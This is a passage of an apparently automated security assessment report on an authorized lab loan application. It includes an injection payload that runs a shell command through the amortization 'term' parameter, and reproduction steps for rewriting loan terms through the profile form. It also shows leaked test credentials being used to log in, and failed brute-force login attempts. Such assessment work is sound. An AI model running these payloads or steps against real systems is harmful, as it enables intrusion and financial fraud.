                    <td>8</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>9</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>10</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>11</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>12</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>13</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>14</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>15</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>16</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>17</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>18</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>19</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>20</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>21</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>22</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>23</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>24</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>25</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>26</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>27</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>28</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>29</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>30</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>31</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>32</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>33</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>34</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>35</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>36</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>37</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>38</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>39</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>40</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>41</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
        </tbody>
    </table>
</body>
</html>
```

- Evidence `ev-mr32pq1o-5j` — `artifacts/s-0005/ev-mr32pq1o-5j/`

Request:

```http
GET /amortization?principal=10000&term=lipsum.__globals__.os.popen(%27echo%20AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%27).read().__len__()&rate=0.05 HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 7138
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:38:11 GMT
expires: 0
keep-alive: timeout=5, max=98
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amortization Table</title>
    <i>This feature is not yet fully implented.</i>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
    </style>
</head>
<body>
    <h2>Amortization Table</h2>
    <table id="paymentTable">
        <thead>
            <tr>
                <th>Payment Number</th>
                <th>Principal</th>
                <th>Interest</th>
            </tr>
        </thead>
        <tbody>
            
                <tr>
                    <td>1</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>2</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>3</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>4</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>5</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>6</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>7</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>8</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>9</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>10</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>11</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>12</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>13</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>14</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>15</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>16</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>17</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>18</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>19</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>20</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>21</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>22</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>23</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>24</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>25</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>26</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>27</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>28</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>29</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>30</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>31</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>32</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>33</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>34</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>35</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>36</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>37</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>38</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>39</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>40</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
                <tr>
                    <td>41</td>
                    <td>N/A</td>
                    <td>N/A</td>
                </tr>
            
        </tbody>
    </table>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [price-tampering] Loan terms fully client-editable via profile update (price/terms tampering)

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836

The POST /profile update form accepts server-authoritative loan financials — loan_amount, loan_term_months and monthly_payment — as free client-supplied fields with no server-side validation or consistency check. A borrower can set arbitrary, mutually inconsistent values (e.g. loan principal 500000, term 1 month, monthly payment 0.01). The manipulated figures persist and are rendered as authoritative on /loan_details ("Your loan principal is 500000 / Your monthly payment is 0.01"). These are financial obligation values that should be computed/approved server-side, not editable by the account holder, allowing self-service manipulation of the loan terms the account owes.

**Reproduction**

```
1. Log in as a normal user and open /profile.
2. Submit the profile form (POST /profile) with body: name=John&lastname=Doe&email=john@example.com&loan_amount=500000&loan_term_months=1&monthly_payment=0.01
3. GET /loan_details — it now reports "Your loan principal is 500000", term "1 months", "Your monthly payment is 0.01".
Control (legit values loan_amount=10000/monthly_payment=850) does NOT show the 0.01 marker; the two manipulated replays both do.
```

**Evidence**

- Evidence `ev-mr31t52w-1s` — `artifacts/s-0003/ev-mr31t52w-1s/`

Request:

```http
GET /loan_details HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 2450
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:12:50 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Details</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Loan Details</h2>
                <p>Your loan principal is 10000.0</p>
                <p>The term of your loan principal 12 months</p>
                <p>Your monthly payment is 850.0</p>

                <!-- Button to trigger loading of amortization table in iframe -->
                <button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
                
                <!-- Placeholder for iframe -->
                <div id="iframeContainer" style="margin-top: 20px;">
                    <iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>

    <!-- jQuery (you may need to include it if not already included) -->
    <script src="/static/js/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            // Event listener for button click
            $('#showAmortizationTable').click(function() {
                // Set the iframe src attribute to the /amortization endpoint
                $('#amortizationIframe').attr('src', '/amortization?term=12');
            });
        });
    </script>
</body>
</html>
```

- Evidence `ev-mr31t5ka-1u` — `artifacts/s-0003/ev-mr31t5ka-1u/`

Request:

```http
GET /loan_details HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 2448
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:12:51 GMT
expires: 0
keep-alive: timeout=5, max=97
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Details</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Loan Details</h2>
                <p>Your loan principal is 500000.0</p>
                <p>The term of your loan principal 1 months</p>
                <p>Your monthly payment is 0.01</p>

                <!-- Button to trigger loading of amortization table in iframe -->
                <button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
                
                <!-- Placeholder for iframe -->
                <div id="iframeContainer" style="margin-top: 20px;">
                    <iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>

    <!-- jQuery (you may need to include it if not already included) -->
    <script src="/static/js/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            // Event listener for button click
            $('#showAmortizationTable').click(function() {
                // Set the iframe src attribute to the /amortization endpoint
                $('#amortizationIframe').attr('src', '/amortization?term=1');
            });
        });
    </script>
</body>
</html>
```

- Evidence `ev-mr31t61i-1w` — `artifacts/s-0003/ev-mr31t61i-1w/`

Request:

```http
GET /loan_details HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 2448
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:12:52 GMT
expires: 0
keep-alive: timeout=5, max=95
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Details</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Loan Details</h2>
                <p>Your loan principal is 500000.0</p>
                <p>The term of your loan principal 1 months</p>
                <p>Your monthly payment is 0.01</p>

                <!-- Button to trigger loading of amortization table in iframe -->
                <button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
                
                <!-- Placeholder for iframe -->
                <div id="iframeContainer" style="margin-top: 20px;">
                    <iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>

    <!-- jQuery (you may need to include it if not already included) -->
    <script src="/static/js/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            // Event listener for button click
            $('#showAmortizationTable').click(function() {
                // Set the iframe src attribute to the /amortization endpoint
                $('#amortizationIframe').attr('src', '/amortization?term=1');
            });
        });
    </script>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [HIGH] [price-tampering] Multi-step price tampering: borrower rewrites loan principal via /profile → authoritative /loan_details record

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836

POST /profile accepts an arbitrary loan_amount (loan principal) with no server-side validation or authorization, and the submitted value becomes the borrower's AUTHORITATIVE loan record rendered at GET /loan_details. This is a multi-step (write-then-read) business-logic flaw: the customer unilaterally sets the financial terms the system treats as official.

Walked flow: step1 POST /profile loan_amount=1337 → 302; step2 GET /loan_details → "Your loan principal is 1337.0". Confirmed value takes over the record: earlier POSTs also drove /loan_details to "principal is 1.0" and "999 months" and "monthly payment is 0.01" simultaneously (loan_amount, loan_term_months and monthly_payment are all attacker-controlled and all propagate). A borrower can inflate an approved principal, or zero out principal/payment/term to escape repayment.

Distinct from the already-recorded single-request price-tampering on /profile monthly_payment: this documents the loan_amount (principal) parameter and, more importantly, the cross-endpoint propagation of the manipulated figure into the loan-of-record shown by /loan_details. Root cause: profile update is trusted as the source of truth for loan terms that should be set/validated server-side and immutable to the borrower.

**Reproduction**

```
1. Log in as a normal user (test:test).
2. POST /profile (application/x-www-form-urlencoded) body: name=John&lastname=Doe&email=john@example.com&loan_amount=1337&loan_term_months=12&monthly_payment=850.0 → 302 to /home.
3. GET /loan_details → renders "Your loan principal is 1337.0" (the injected value is now the authoritative loan record).
4. Extremes work identically: loan_amount=1, loan_term_months=999, monthly_payment=0.01 → /loan_details shows principal 1.0 / 999 months / payment 0.01.
Fix: loan principal/term/payment must be set and validated server-side (against the approved loan), never taken from a borrower-editable profile form; make these fields read-only for the customer and re-derive monthly_payment from validated principal+term+rate.
```

**Evidence**

- Evidence `ev-mr32vkbh-5x` — `artifacts/_/ev-mr32vkbh-5x/`

Request:

```http
GET /loan_details HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 2450
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:42:43 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Details</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Loan Details</h2>
                <p>Your loan principal is 10000.0</p>
                <p>The term of your loan principal 12 months</p>
                <p>Your monthly payment is 850.0</p>

                <!-- Button to trigger loading of amortization table in iframe -->
                <button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
                
                <!-- Placeholder for iframe -->
                <div id="iframeContainer" style="margin-top: 20px;">
                    <iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>

    <!-- jQuery (you may need to include it if not already included) -->
    <script src="/static/js/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            // Event listener for button click
            $('#showAmortizationTable').click(function() {
                // Set the iframe src attribute to the /amortization endpoint
                $('#amortizationIframe').attr('src', '/amortization?term=12');
            });
        });
    </script>
</body>
</html>
```

- Evidence `ev-mr32vkve-5z` — `artifacts/_/ev-mr32vkve-5z/`

Request:

```http
GET /loan_details HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 2449
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:42:44 GMT
expires: 0
keep-alive: timeout=5, max=97
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Details</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Loan Details</h2>
                <p>Your loan principal is 1337.0</p>
                <p>The term of your loan principal 12 months</p>
                <p>Your monthly payment is 850.0</p>

                <!-- Button to trigger loading of amortization table in iframe -->
                <button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
                
                <!-- Placeholder for iframe -->
                <div id="iframeContainer" style="margin-top: 20px;">
                    <iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>

    <!-- jQuery (you may need to include it if not already included) -->
    <script src="/static/js/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            // Event listener for button click
            $('#showAmortizationTable').click(function() {
                // Set the iframe src attribute to the /amortization endpoint
                $('#amortizationIframe').attr('src', '/amortization?term=12');
            });
        });
    </script>
</body>
</html>
```

- Evidence `ev-mr32vlfa-61` — `artifacts/_/ev-mr32vlfa-61/`

Request:

```http
GET /loan_details HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 2449
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:42:44 GMT
expires: 0
keep-alive: timeout=5, max=95
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Cookie,Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Details</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Loan Details</h2>
                <p>Your loan principal is 1337.0</p>
                <p>The term of your loan principal 12 months</p>
                <p>Your monthly payment is 850.0</p>

                <!-- Button to trigger loading of amortization table in iframe -->
                <button id="showAmortizationTable" class="btn btn-primary">Show Amortization Table</button>
                
                <!-- Placeholder for iframe -->
                <div id="iframeContainer" style="margin-top: 20px;">
                    <iframe id="amortizationIframe" src="" style="width: 100%; height: 500px; border: none;"></iframe>
                </div>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="/home">Home</a></li>
                            <li class="list-group-item"><a href="/profile">Profile</a></li>
                            <li class="list-group-item"><a href="/loan_details">Loan Details</a></li>
                            <li class="list-group-item"><a href="/logout">Exit</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>

    <!-- jQuery (you may need to include it if not already included) -->
    <script src="/static/js/jquery.min.js"></script>

    <script>
        $(document).ready(function() {
            // Event listener for button click
            $('#showAmortizationTable').click(function() {
                // Set the iframe src attribute to the /amortization endpoint
                $('#amortizationIframe').attr('src', '/amortization?term=12');
            });
        });
    </script>
</body>
</html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [secret-exposure] Valid credentials (test:test) disclosed in login page HTML comment

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836

The GET /login page source contains the HTML comment "<!-- TODO: Delete the testing account (test:test). -->", disclosing a working username/password pair to any unauthenticated visitor. These credentials are live: POST /login with username=test&password=test authenticates successfully (302 -> /home) and issues a Flask session cookie for user_id 1 (session value base64-decodes to {"user_id":1}). Any anonymous user who views the page source obtains full authenticated access to the application. Wrong password for the same user (test/brute1) is correctly rejected (200 "Invalid username or password"), confirming the credential pair is what grants access, not a catch-all. Severity would rise to high/critical if user_id 1 is a privileged/admin account.

**Reproduction**

```
1. GET http://target.local:32836/login and read the page source; observe the comment: <!-- TODO: Delete the testing account (test:test). -->. 2. Negative control: POST /login (no session) body username=test&password=brute1 -> 200, "Invalid username or password" (ev-mr31lbeq-14). 3. POST /login (no session) body username=test&password=test -> 302 Location /home, Set-Cookie session=eyJ1c2VyX2lkIjoxfQ... (ev-mr31kqhp-12). 4. Repeat step 3 -> same 302 + session (ev-mr31kr1e-13). The leaked credentials grant a valid authenticated session as user_id 1.
```

**Evidence**

- Evidence `ev-mr31lbeq-14` — `artifacts/s-0001/ev-mr31lbeq-14/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=brute1
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:06:45 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr31kqhp-12` — `artifacts/s-0001/ev-mr31kqhp-12/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:06:18 GMT
expires: 0
keep-alive: timeout=5, max=98
location: /home
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/home">/home</a>. If not, click the link.
```

- Evidence `ev-mr31kr1e-13` — `artifacts/s-0001/ev-mr31kr1e-13/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32836
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 05:06:19 GMT
expires: 0
keep-alive: timeout=5, max=97
location: /home
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/home">/home</a>. If not, click the link.
```

<a id="finding-5"></a>

### 5. [LOW] [rate-limit] No rate limiting or account lockout on /login (brute-force enabled)

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32836

The POST /login endpoint applies no rate limiting, throttling, CAPTCHA, or account-lockout. ~20 consecutive failed authentication attempts (including a 12-request rapid burst) against user 'test' with wrong passwords were each processed fully and returned 200 with the generic "Invalid username or password" message — no 429, no Retry-After, no progressive delay, no lockout, no challenge at any point. The endpoint continues to accept and evaluate credentials indefinitely, permitting unlimited online password brute-force / credential-stuffing. The distinguishing control (a genuine test:test attempt) returns a differentiated 302 success, confirming each request is fully evaluated rather than blanket-blocked by a WAF.

